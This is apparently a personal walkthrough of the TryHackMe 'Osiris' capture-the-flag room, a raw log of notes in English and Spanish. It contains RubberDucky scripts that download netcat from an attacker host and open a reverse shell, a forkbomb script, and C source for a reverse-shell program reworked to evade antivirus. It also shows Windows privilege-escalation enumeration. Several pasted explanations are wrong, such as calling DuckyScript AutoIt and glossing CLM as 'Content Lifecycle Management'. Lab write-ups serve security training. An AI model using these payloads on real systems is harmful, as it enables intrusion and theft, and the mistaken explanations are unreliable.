---
Can you Quack it?
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/fe8053432e57f1958c78240c42e094a2.png)

###  Osiris

 Start Machine

**Story**

As a final blow to Windcorp's security, you intend to hack the laptop of the CEO, Charlotte Johnson. You heard she has a boatload of Bitcoin, and those seem mighty tasty to you. But they have learned from the previous hacks and have introduced strict security measures.

However, you dropped a wifi RubberDucky on her driveway. Charlotte and her personal assistant Alcino, just drove up to her house and he picks up the bait as they enter the building. Sitting in your black van, just outside her house, you wait for them to plug in the RubberDucky (curiosity kills cats, remember?) and once you see the Ducky’s Wifi network pop up, you make a connection to the RubberDucky and are ready to send her a payload…

This is where your journey begins. Can you come up with a payload and get that sweet revshell? And if you do, can you bypass the tightened security? Remember, antivirus tools aren’t the sharpest tools in the shed, sometimes changing the code a little bit and recompiling the executable can bypass these simplest of detections.

As a final hint_,_ remember that you have pwned their domain controller. You might need to revisit [Ra](https://tryhackme.com/room/ra) or [Ra2](https://tryhackme.com/room/ra2) to extract a key component to manage this task, you will need the keys to the kingdom... 

**Info:** To simulate the payload delivery, we have put up a TFTP-server on the target computer. Use that, to upload your RubberDucky-scripts.

**Important:** The TFTP server itself, any software or scripts you find regarding the RubberDucky is not a part of the challenge.

Also; remember you are deploying Ducky-script to a box with limited resources. Give it more time than you usually would, to finish the tasks.

The box will need about 5 minutes before it is fully operational.

  

Please do **NOT** post write-ups or stream solution until it has been out for at least two weeks. 

**The official writeup, is password protected by Flag3**

  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.134.236 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
^C

┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- -Pn 10.10.134.236 -vv --min-rate 1500
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 19:24 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:24
Completed Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed
Initiating Connect Scan at 19:24
Scanning 10.10.134.236 [65535 ports]
Connect Scan Timing: About 23.54% done; ETC: 19:26 (0:01:41 remaining)
Connect Scan Timing: About 46.60% done; ETC: 19:26 (0:01:10 remaining)
Connect Scan Timing: About 69.72% done; ETC: 19:26 (0:00:40 remaining)
Completed Connect Scan at 19:26, 130.84s elapsed (65535 total ports)
Initiating Service scan at 19:26
NSE: Script scanning 10.10.134.236.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 5.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report for 10.10.134.236
Host is up, received user-set.
Scanned at 2023-01-02 19:24:34 EST for 136s
All 65535 scanned ports on 10.10.134.236 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.08 seconds

┌──(kali㉿kali)-[~]
└─$ mkdir Osiris    
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cd Osiris 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Osiris]
└─$ tftp 
(to) 
usage: connect host-name [port]
tftp> connect 10.10.134.236


https://github.com/UndedInside/DuckyScripts/blob/main/test_linux_forkbomb.txt

REM Forkbomb to crash Linux machines

DEFAULT_DELAY 700

ALT T

STRING :(){ :!:& };:

ENTER

https://www.jesusninoc.com/03/09/scripts-en-rubber-ducky-parte-1/

open chrome

DELAY 5000

GUI r

DELAY 50

STRING chrome www.jesusninoc.com

ENTER

DELAY 1000

F11

https://forums.hak5.org/topic/42442-3-second-powershell-execution-as-much-powershell-code-as-you-want/

https://github.com/insecurityofthings/jackit/wiki

I see it

https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference

https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration#network-medium-exfiltration

https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration#physical-medium-exfiltration

Finally

┌──(kali㉿kali)-[~/Osiris]
└─$ cat rev.txt                           
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.8.19.103:1337/nc64.exe -outfile c:\windows\temp\nc64.exe
ENTER
DELAY 1000
STRING c:\windows\temp\nc64.exe 10.8.19.103 4444 -e cmd
ENTER

This is a script written in AutoIt, a programming language that is used to automate tasks in Windows. This script is performing the following actions:

1.  Waits for 500 milliseconds (half a second).
2.  Opens the Run dialog in Windows by pressing the "r" key.
3.  Waits for 500 milliseconds.
4.  Types the text "powershell -W hidden" in the Run dialog and presses Enter.
5.  Waits for 1 second.
6.  Presses Enter again.
7.  Types the command "Invoke-WebRequest [http://10.8.19.103/nc64.exe](http://10.8.19.103/nc64.exe) -outfile c:\windows\temp\nc64.exe" and presses Enter. This command downloads a file from the specified URL and saves it to the "temp" folder in the Windows directory.
8.  Waits for 1 second.
9.  Types the command "c:\windows\temp\nc64.exe 10.8.19.103 4444 -e cmd" and presses Enter. This command runs the downloaded file with the specified arguments.

:)

                                                                                                                                                            
┌──(kali㉿kali)-[~/Osiris]
└─$ locate nc64.exe 
/home/kali/hackthebox/nc64.exe
/home/kali/msdt-follina/msdt-follina/nc64.exe
/home/kali/ra2/nc64.exe
                                                                                                                                                            
┌──(kali㉿kali)-[~/Osiris]
└─$ cp /home/kali/ra2/nc64.exe nc64.exe
                                                                                                                                                            
┌──(kali㉿kali)-[~/Osiris]
└─$ ls             
nc64.exe  rev.txt
                                                                                                                                                            
┌──(kali㉿kali)-[~/Osiris]
└─$ chmod +x nc64.exe 

tftp> put rev.txt

┌──(kali㉿kali)-[~/Osiris]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

┌──(kali㉿kali)-[~/Osiris]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...

┌──(kali㉿kali)-[~/Osiris]
└─$ tftp              
(to) 10.10.134.236
tftp> put rev.txt
Transfer timed out.

tftp> status
Connected to 10.10.134.236.
Mode: netascii Verbose: off Tracing: off Literal: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds

https://kalilinuxtutorials.com/defendercheck/

┌──(kali㉿kali)-[~/Osiris]
└─$ cat na.c           
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);

void Run(char* Server, int Port) {

HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup"); 

        SOCKET s12;
        struct sockaddr_in addr;
        WSADATA version;
        myWSAStartup(MAKEWORD(2,2), &version);
        s12 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = myinet_addr(Server);
        addr.sin_port = myhtons(Port);

        if (myWSAConnect(s12, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            myclosesocket(s12);
            myWSACleanup();
        } else {
            
            char P1[] = "cm";
            char P2[] = "d.exe";
            char* P = strcat(P1, P2);
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s12;
            CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        Run(argv[1], port);
    }
    else {
        char host[] = "10.8.19.103";
        int port = 1234;
        Run(host, port);
    }
    return 0;
} 

┌──(kali㉿kali)-[~/Osiris]
└─$ i686-w64-mingw32-gcc na.c -o na.exe       
                                                                                                                                                            
┌──(kali㉿kali)-[~/Osiris]
└─$ ls
DefenderCheck  na.c  na.exe  nc64.exe  rev.txt

┌──(kali㉿kali)-[~/Osiris]
└─$ cat rev.txt                  
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.8.19.103/na.exe -outfile c:\windows\temp\na.exe
ENTER
DELAY 1000
STRING c:\windows\temp\na.exe
ENTER

                                                                                                                                                            
┌──(kali㉿kali)-[~/Osiris]
└─$ tftp
(to) 10.10.134.236
tftp> status      
Connected to 10.10.134.236.
Mode: netascii Verbose: off Tracing: off Literal: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put na.txt
Transfer timed out.


not work, need to bypass AV

I see it in my machine won't work , in attackbox yep :)

root@ip-10-10-119-139:~/Desktop/test# apt install tftp 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  docutils-common python-bs4 python-chardet python-dicttoxml python-dnspython
  python-html5lib python-jsonrpclib python-lxml python-mechanize
  python-olefile python-pypdf2 python-slowaes python-webencodings
  python-xlsxwriter python3-botocore python3-docutils python3-jmespath
  python3-pygments python3-roman python3-rsa python3-s3transfer xml-core
Use 'apt autoremove' to remove them.
The following NEW packages will be installed
  tftp
0 to upgrade, 1 to newly install, 0 to remove and 716 not to upgrade.
Need to get 16.5 kB of archives.
After this operation, 49.2 kB of additional disk space will be used.
Get:1 http://eu-west-1.ec2.archive.ubuntu.com/ubuntu bionic/universe amd64 tftp amd64 0.17-18ubuntu3 [16.5 kB]
Fetched 16.5 kB in 0s (355 kB/s)
Selecting previously unselected package tftp.
(Reading database ... 377068 files and directories currently installed.)
Preparing to unpack .../tftp_0.17-18ubuntu3_amd64.deb ...
Unpacking tftp (0.17-18ubuntu3) ...
Setting up tftp (0.17-18ubuntu3) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
root@ip-10-10-119-139:~/Desktop/test# tftp
tftp> connect 10.10.94.47
tftp> status
Connected to 10.10.94.47.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put aa.txt
Sent 6 bytes in 0.0 seconds

REM The next three lines execute a command prompt in Windows
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.10.119.139:1234/nc.exe -outfile c:\windows\temp\nc.exe
ENTER
DELAY 1000
STRING c:\windows\temp\nc.exe 10.10.119.139 17777 -e cmd
ENTER


tftp> put rev.txt
Sent 323 bytes in 0.0 seconds

root@ip-10-10-119-139:~/Desktop/test# python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.94.47 - - [03/Jan/2023 16:02:12] "GET /nc.exe HTTP/1.1" 200 -

root@ip-10-10-119-139:~/Desktop/test# nc -lvnp 17777
Listening on [0.0.0.0] (family 0, port 17777)

root@ip-10-10-119-139:~/Desktop/test# nc -lvnp 17777
Listening on [0.0.0.0] (family 0, port 17777)
Connection from 10.10.94.47 50766 received!
Microsoft Windows [Version 10.0.19041.508]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\alcrez>whoami
whoami
windcorp\alcrez

C:\Users\alcrez>cd Desktop
cd Desktop

C:\Users\alcrez\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\Users\alcrez\Desktop

09/19/2020  12:34 AM    <DIR>          .
09/19/2020  12:34 AM    <DIR>          ..
09/19/2020  12:34 AM                45 Flag1.txt
09/16/2020  11:18 AM             1,034 Update VPN.lnk
               2 File(s)          1,079 bytes
               2 Dir(s)  36,793,155,584 bytes free

C:\Users\alcrez\Desktop>type Flag1.txt
type Flag1.txt
THM{89b556686aa61301d4a72a7b12e59368a516c940}

:)

mine
PS C:\Users\User> $ExecutionContext.SessionState.LanguageMode
FullLanguage

machine

C:\Users\alcrez\Desktop>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\alcrez\Desktop> $ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

La variable de entorno $ExecutionContext.SessionState.LanguageMode representa el modo de idioma de PowerShell. El modo de idioma es una configuración que determina el conjunto de características y sintaxis admitidas por la consola de PowerShell. El modo de idioma puede estar configurado en "FullLanguage", "NoLanguage" o "ConstrainedLanguage".

-   "FullLanguage" habilita todas las características de PowerShell.
-   "NoLanguage" deshabilita todas las características de PowerShell.
-   "ConstrainedLanguage" habilita un subconjunto de características de PowerShell que se consideran seguras.

El modo de idioma se puede configurar en el archivo de configuración de PowerShell o mediante el cmdlet Set-ExecutionPolicy.


It is likely that the CLM (Content Lifecycle Management) system has detected that the file is suspected of being malicious and has taken action to protect against it, such as activating antivirus protection or quarantining the file.


---

cacls is a command in the Windows operating system that allows users to view and modify file permissions and access control lists (ACLs). The command can be used to grant or revoke access rights for users or groups to files and directories. The syntax for the cacls command is:

cacls [filename] [options]

Where [filename] is the name of the file or directory that you want to modify the permissions for, and [options] are the options for modifying the ACLs. Some common options for cacls include:

-g [user]:[permission] - grants the specified user the specified permission (e.g. cacls c:\windows\temp -g Administrator:R grants the Administrator read access to the temp directory) -r - removes all permissions for the specified user (e.g. cacls c:\windows\temp -r Administrator removes all permissions for the Administrator on the temp directory) -p [user]:[permission] - sets the specified permission for the specified user (e.g. cacls c:\windows\temp -p Administrator:F sets full control for the Administrator on the temp directory)

---

The command `dir /s c:\temp` will list the contents of the `temp` directory and its subdirectories in the `c:\` directory. The `/s` flag includes subdirectories in the search.

For example, if the `temp` directory contains the following subdirectories and files:

Copy code

`temp ├── folder1 │   ├── file1.txt │   └── file2.txt └── file3.txt`

Running `dir /s c:\temp` would produce the following output:

Copy code

 `Volume in drive C has no label.  Volume Serial Number is 24A6-9E61   Directory of c:\temp  09/23/2022  02:07 PM    <DIR>          folder1 09/23/2022  02:07 PM                12 file3.txt                1 File(s)             12 bytes                2 Dir(s)  78,481,656,576 bytes free  Directory of c:\temp\folder1  09/23/2022  02:07 PM                18 file1.txt 09/23/2022  02:07 PM                24 file2.txt                2 File(s)             42 bytes                0 Dir(s)  78,481,656,576 bytes free`


---

C:\Users\alcrez\Desktop>type "Update VPN.lnk"
type "Update VPN.lnk"
L\ufffdF \ufffd\ufffd\ufffdY\ufffd\ufffd\ufffd
                \ufffd\ufffdY\ufffd\ufffd9\ufffd\ufffdY\ufffd\ufffdQ\ufffd\ufffdP\ufffdO\ufffd \ufffd:i\ufffd+00\ufffd/C:\T10Q\u0655script>	\ufffd\ufffd0Q\u06550Q\u0655.WT
   \ufffd\ufffd|script`2Q0Q\ufffd\ufffd update.vbsF	\ufffd\ufffd0Q\ufffd\ufffd0Q\ufffd\ufffd.dn\ufffd-5update.vbsC-B3N\ufffd\ufffdC:\script\update.vbs..\..\..\script\update.vbs	C:\script!%SystemRoot%\System32\SHELL32.dll`\ufffdXosirisZZ\ufffd\u06f7\ufffdA\ufffd\ufffd3\ufffd\ufffd?\ufffdY\ufffd\ufffd\ufffd\ufffd\ufffd
                                                    )\ufffd\ufffd?ZZ\ufffd\u06f7\ufffdA\ufffd\ufffd3\ufffd\ufffd?\ufffdY\ufffd\ufffd\ufffd\ufffd\ufffd
                                                                               )\ufffd\ufffd?\ufffd	\ufffdE1SPS\ufffd0\ufffd\ufffdC\ufffdG\ufffd\ufffd\ufffd\ufffdsf")d
                                script (C:)\ufffd1SPS0\ufffd%\ufffd\ufffdG\ufffd\ufffd`\ufffd\ufffd\ufffd\ufffd)

 update.vbs@g\ufffd\ufffdY\ufffd\ufffd
                     Q=VBScript Script File@9\ufffd\ufffdY\ufffd\ufffdY1SPS\ufffdjc(=\ufffd\ufffd\ufffd\ufffd\ufffdO\ufffd\ufffd=C:\script\update.vbs91SPS\ufffdmD\ufffd\ufffdpH\ufffdH@.\ufffd=x\ufffdhH\ufffdA2\ufffd0

C:\Users\alcrez\Desktop>dir C:\script\update.vbs
dir C:\script\update.vbs
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\script

09/16/2020  10:47 AM                81 update.vbs
               1 File(s)             81 bytes
               0 Dir(s)  36,796,989,440 bytes free

C:\Users\alcrez\Desktop>type C:\script\update.vbs
type C:\script\update.vbs
Set shell = CreateObject("WScript.Shell")
shell.LogEvent 4, "Update VPN profile"

C:\Users\alcrez\Desktop>dir C:\script
dir C:\script
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\script

09/16/2020  11:18 AM    <DIR>          .
09/16/2020  11:18 AM    <DIR>          ..
09/16/2020  11:17 AM               279 copyprofile.cmd
09/16/2020  10:47 AM                81 update.vbs
               2 File(s)            360 bytes
               2 Dir(s)  36,796,821,504 bytes free

C:\Users\alcrez\Desktop>type c:\script\copyprofile.cmd
type c:\script\copyprofile.cmd
powershell -c "Invoke-WebRequest https://vpn.windcorp.thm/profile.zip -outfile c:\temp\profile.zip"
powershell Expand-Archive c:\temp\profile.zip -DestinationPath c:\temp\
powershell -c "copy-Item -Path 'C:\Temp\*' -Destination 'C:\Program Files\IVPN Client' -Recurse -force"

Update.vbs only writes an event with ID 4 to the event log on the system.
Copyprofile.cmd retrieves a zipfile from a corporate server It extracts that zipfile to c:\temp And it copy everything from c:\temp recursive to c:\program files\IVPN Client\

C:\Users\alcrez\Desktop>cd c:\temp  
cd c:\temp

c:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\Temp

11/22/2020  11:59 AM    <DIR>          .
11/22/2020  11:59 AM    <DIR>          ..
09/16/2020  10:55 AM    <DIR>          OpenVPN
               0 File(s)              0 bytes
               3 Dir(s)  36,810,760,192 bytes free

c:\script>cacls *               
cacls *
c:\script\copyprofile.cmd BUILTIN\Administrators:(ID)F 
                          NT AUTHORITY\SYSTEM:(ID)F 
                          BUILTIN\Users:(ID)R 
                          OSIRIS\scheduler:(ID)F 

c:\script\update.vbs BUILTIN\Administrators:(ID)F 
                     NT AUTHORITY\SYSTEM:(ID)F 
                     BUILTIN\Users:(ID)R 
                     OSIRIS\scheduler:(ID)F 

El comando cacls muestra los permisos de acceso para los archivos y carpetas en el sistema. En este caso, se están mostrando los permisos para los archivos "copyprofile.cmd" y "update.vbs" en la carpeta "c:\script". Cada línea muestra el nombre del usuario o grupo y sus permisos de acceso. Los permisos de acceso pueden ser (ID)F (completo control), (ID)C (lectura y ejecución), (ID)R (sólo lectura) o (ID)N (ningún acceso).

We see a user "scheduler" has full access, but we have only read.

c:\script>dir /s c:\temp
dir /s c:\temp
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\temp

11/22/2020  11:59 AM    <DIR>          .
11/22/2020  11:59 AM    <DIR>          ..
09/16/2020  10:55 AM    <DIR>          OpenVPN
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN

09/16/2020  10:55 AM    <DIR>          .
09/16/2020  10:55 AM    <DIR>          ..
09/16/2020  11:16 AM    <DIR>          x86_64
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN\x86_64

09/16/2020  11:16 AM    <DIR>          .
09/16/2020  11:16 AM    <DIR>          ..
09/16/2020  11:16 AM             1,554 ca.crt
09/16/2020  11:16 AM             5,099 client1.crt
09/16/2020  11:16 AM             1,675 client1.key
09/16/2020  11:16 AM               247 IVPN-Singlehop-Canada-Toronto-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Canada-Toronto.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-France-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-France.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Germany-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Germany.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Hongkong-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Hongkong.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Iceland-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Iceland.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Netherlands-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Netherlands.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Romania-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Romania.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-Switzerland-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-Switzerland.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-UK-London-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-UK-London.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-Dallas-TX-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-Dallas-TX.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-Los-Angeles-CA-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-Los-Angeles-CA.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-New-Jersey-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-New-Jersey.conf
09/16/2020  11:16 AM               247 IVPN-Singlehop-USA-SaltLakeCity-UT-TCP-mode.conf
09/16/2020  11:16 AM               241 IVPN-Singlehop-USA-SaltLakeCity-UT.conf
09/16/2020  11:16 AM               636 ta.key
              30 File(s)         15,308 bytes

     Total Files Listed:
              30 File(s)         15,308 bytes
               8 Dir(s)  36,803,346,432 bytes free

From the enumeration, we know that the `Update VPN.lnk` is a shortcut to run `update.vbs` script in the `C:\script\` folder.

And `C:\script\` folder contain 2 files --- `update.vbs` and `copyprofile.cmd`, these 2 files work together to perform below action.

The `update.vbs` only writes an event with ID 4 to the event log on the system.

However `copyprofile.cmd` does some interesting stuff, it started with download VPN profile as a zip file from `vpn.windcorp.thm` to `C:\temp\`, and then unzip it to the destination `C:\Program Files\IVPN Client`.

Searching for unquoted service paths, actually reveals two services with that flaw.

PS C:\Temp> cmd
cmd
Microsoft Windows [Version 10.0.19041.508]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Temp>cd c:\program files\IVPN Client
cd c:\program files\IVPN Client

c:\Program Files\IVPN Client>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\Program Files\IVPN Client

11/22/2020  11:59 AM    <DIR>          .
11/22/2020  11:59 AM    <DIR>          ..
01/14/2015  05:41 AM             4,284 1
09/13/2020  03:42 AM    <DIR>          de
01/07/2015  02:04 PM                60 down.bat
09/13/2020  03:42 AM    <DIR>          en
01/07/2015  02:04 PM                35 envinfo.bat
09/13/2020  03:42 AM    <DIR>          es
09/13/2020  03:42 AM    <DIR>          etc
09/13/2020  03:42 AM    <DIR>          fr
09/13/2020  03:42 AM    <DIR>          it
05/12/2015  10:11 AM           879,104 IVPN Client.exe
01/27/2015  02:09 AM             4,106 IVPN Client.exe.config
05/12/2015  10:11 AM            77,824 IVPN Firewall Native.dll
05/12/2015  10:11 AM            49,152 IVPN Firewall.dll
05/12/2015  10:11 AM            33,280 IVPN Service.exe
01/27/2015  02:09 AM               144 IVPN Service.exe.config
05/12/2015  10:11 AM            93,696 IVPN.Core.dll
05/12/2015  10:11 AM            10,240 ivpncli.exe
01/27/2015  02:09 AM               161 ivpncli.exe.config
04/10/2015  09:23 PM            24,224 ivpncli.vshost.exe
01/27/2015  02:09 AM               161 ivpncli.vshost.exe.config
06/18/2013  04:28 AM               490 ivpncli.vshost.exe.manifest
02/18/2015  01:34 PM            34,304 IVPNCommon.dll
09/13/2020  03:42 AM    <DIR>          ja
09/13/2020  03:42 AM    <DIR>          ko
01/03/2023  10:26 AM    <DIR>          log
05/12/2015  10:11 AM           823,296 MahApps.Metro.dll
05/12/2015  10:11 AM           276,281 MahApps.Metro.xml
05/12/2015  10:11 AM            29,184 ManagedWifi.dll
05/12/2015  10:11 AM             9,216 NetworkHelpers.dll
02/20/2015  01:42 AM           513,536 Newtonsoft.Json.dll
02/20/2015  01:42 AM           494,336 Newtonsoft.Json.xml
09/13/2020  03:42 AM    <DIR>          OpenVPN
09/13/2020  03:42 AM    <DIR>          Resources
05/25/2010  07:26 AM            39,936 System.Windows.Interactivity.dll
05/25/2010  07:12 AM            62,128 System.Windows.Interactivity.xml
09/13/2020  03:42 AM           111,540 Uninstall.exe
01/07/2015  02:04 PM                59 up.bat
09/13/2020  03:42 AM    <DIR>          zh-Hans
09/13/2020  03:42 AM    <DIR>          zh-Hant
              26 File(s)      3,570,777 bytes
              15 Dir(s)  36,796,395,520 bytes free

c:\Program Files\IVPN Client>wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
IVPN Client                                                                         IVPN Client                               C:\Program Files\IVPN Client\IVPN Service.exe                                          Auto       
nordvpn-service                                                                     nordvpn-service                           C:\Program Files\NordVPN\nordvpn-service.exe                                           Auto    

La orden wmic service obtiene información sobre los servicios del sistema, incluyendo el nombre del servicio, el nombre para mostrar en la interfaz de usuario, la ruta del archivo ejecutable del servicio y el modo de inicio. El resultado se envía a la orden findstr, que busca cadenas de texto en su entrada y muestra las líneas que coinciden.

La opción "/i" hace que la búsqueda sea insensible a mayúsculas y minúsculas y la opción "/v" excluye las líneas que contienen la cadena especificada. Por lo tanto, la orden findstr busca los servicios que están configurados para iniciarse automáticamente (startmode "auto") y excluye aquellos cuyo archivo ejecutable esté ubicado en la carpeta "c:\windows" o que contengan dobles comillas.


Checking access, shows we don’t have any write on the nordvpnservice

c:\Program Files\IVPN Client>cacls "c:\program files\nordvpn"
cacls "c:\program files\nordvpn"
c:\program files\NordVPN NT SERVICE\TrustedInstaller:(ID)F 
                         NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
                         NT AUTHORITY\SYSTEM:(ID)F 
                         NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
                         BUILTIN\Administrators:(ID)F 
                         BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
                         BUILTIN\Users:(ID)R 
                         BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
                                                       GENERIC_READ
                                                       GENERIC_EXECUTE
 
                         CREATOR OWNER:(OI)(CI)(IO)(ID)F 
